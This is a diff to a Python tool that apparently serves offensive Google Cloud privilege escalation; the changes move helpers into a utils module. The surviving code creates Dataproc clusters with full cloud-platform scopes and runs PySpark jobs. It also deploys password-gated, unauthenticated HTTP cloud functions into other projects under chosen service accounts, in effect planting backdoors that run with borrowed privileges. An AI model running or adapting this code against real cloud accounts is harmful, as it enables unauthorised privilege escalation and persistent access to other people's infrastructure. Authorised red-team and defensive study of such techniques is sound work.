@@ -7,20 +7,7 @@ import os
 from urllib.request import Request, urlopen
 from base64 import b64decode, b64encode
 
-def run_gcloud_command_local(command):
-    if command.split(" ")[0] != "gcloud":
-        command = "gcloud " + command
-    print("Running command:")
-    print(command)
-    try:
-        cmd_output = subprocess.check_output(command.split(" "), stderr=subprocess.STDOUT)
-        return cmd_output.decode("utf-8").rstrip()
-    except subprocess.CalledProcessError as E:
-        print("error code", E, E.output)
-        return False
-
-def run_os_command_local(command):
-    return os.system(command)
+from utils import utils
 
 def drop_cf(latest_cf):
     if not os.path.exists("/tmp/base_cloud_function"):
@@ -28,14 +15,10 @@ def drop_cf(latest_cf):
     with open("/tmp/base_cloud_function/main.py", "w+") as f:
         f.write(latest_cf)
 
-def random_name(stringLength=8):
-    letters = string.ascii_lowercase
-    return ''.join(random.choice(letters) for i in range(stringLength))
-
 
 def dataproc_privesc(dest_proj, latest_cf, func_details):
-    cluster_name = random_name()
-    run_gcloud_command_local("gcloud dataproc clusters create {} --region us-central1 --scopes cloud-platform --metadata cf_name={},evilpassword={}".format(cluster_name, func_details["name"], func_details["evil_password"]))
+    cluster_name = utils.random_name()
+    utils.run_gcloud_command_local("gcloud dataproc clusters create {} --region us-central1 --scopes cloud-platform --metadata cf_name={},evilpassword={}".format(cluster_name, func_details["name"], func_details["evil_password"]))
 
     spark_string = "import subprocess\n\nimport os\n\nos.system(\"mkdir /tmp/base_cloud_function && echo \\\""
     spark_string += b64encode(latest_cf.encode("utf-8")).decode("utf-8")
@@ -57,22 +40,20 @@ gcloud functions deploy $CF_NAME --set-env-vars=EVIL_PASSWORD=$CF_PASSWORD --tim
     print(spark_string)
     with open("/tmp/sparkjob.py", "w+") as f:
         f.write(spark_string)
-    run_gcloud_command_local("gcloud dataproc jobs submit pyspark --cluster {} /tmp/sparkjob.py --region us-central1".format(cluster_name))
-    run_gcloud_command_local("gcloud dataproc clusters delete {} --region us-central1 --quiet".format(cluster_name))
+    utils.run_gcloud_command_local("gcloud dataproc jobs submit pyspark --cluster {} /tmp/sparkjob.py --region us-central1".format(cluster_name))
+    utils.run_gcloud_command_local("gcloud dataproc clusters delete {} --region us-central1 --quiet".format(cluster_name))
 
 
 def create_gcf_in_another_project(dest_project, dest_sa, latest_cf, function_props):
     drop_cf(latest_cf)
-    run_gcloud_command_local("gcloud config set project {}".format(dest_project))
-    run_gcloud_command_local("gcloud services enable cloudfunctions.googleapis.com")
-    succeeded = run_gcloud_command_local("gcloud functions deploy {} --set-env-vars=EVIL_PASSWORD={} --timeout 539 --trigger-http --allow-unauthenticated --source /tmp/base_cloud_function --runtime python37 --entry-point hello_world --service-account {}".format(function_props["name"], function_props["evil_password"], dest_sa))
+    utils.run_gcloud_command_local("gcloud config set project {}".format(dest_project))
+    utils.run_gcloud_command_local("gcloud services enable cloudfunctions.googleapis.com")
+    succeeded = utils.run_gcloud_command_local("gcloud functions deploy {} --set-env-vars=EVIL_PASSWORD={} --timeout 539 --trigger-http --allow-unauthenticated --source /tmp/base_cloud_function --runtime python37 --entry-point hello_world --service-account {}".format(function_props["name"], function_props["evil_password"], dest_sa))
     print("~~~~~~~~~~ {} ~~~~~~~~~~".format(succeeded))
     if not succeeded and succeeded != "0" and succeeded != 0:
         print("gcf provisioning failed")
         return False
     return function_props
-
-
 
 
 def hello_world(request):
